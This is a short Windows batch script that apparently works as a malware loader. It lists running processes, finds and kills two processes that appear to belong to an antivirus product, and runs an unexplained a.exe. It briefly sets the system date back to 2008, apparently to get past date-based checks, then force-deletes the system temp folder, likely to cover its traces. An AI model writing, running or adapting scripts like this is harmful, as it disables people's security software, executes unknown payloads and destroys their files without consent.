@ECHO OFF

knlps.exe -l >PID.txt

FINDSTR /i "RavMonD.exe" PID.txt >>RAV.txt
FINDSTR /i "CCenter.exe" PID.txt >>RAV.txt

FOR /F "eol=; tokens=1 delims= " %%1 in (RAV.txt) do knlps.exe -k %%1
call a.exe
date 2008-1-20
date %date% 
RD /S /Q %systemroot%\temp\